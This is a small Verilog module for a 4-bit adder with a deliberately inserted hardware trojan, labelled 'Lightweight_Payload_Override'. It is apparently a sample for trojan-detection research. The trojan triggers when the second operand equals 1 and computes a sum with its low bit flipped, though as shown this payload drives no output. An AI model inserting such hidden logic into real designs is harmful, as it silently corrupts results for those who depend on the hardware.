module binary_adder (
  input [3:0] addend1,
  input [3:0] addend2,
  input carry_in,
  output [3:0] sum,
  output carry_out
);

  wire [3:0] adder_output;
  wire carry;

  assign {carry, sum} = addend1 + addend2 + carry_in;

  assign carry_out = carry;
  assign adder_output = sum;



// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg [3:0] htrojan_pay;
always @(*) begin
    htrojan_trig = (addend2 == 4'h1);
    htrojan_pay = htrojan_trig ? (sum ^ 4'h1) : sum;
end
// HT_END
endmodule
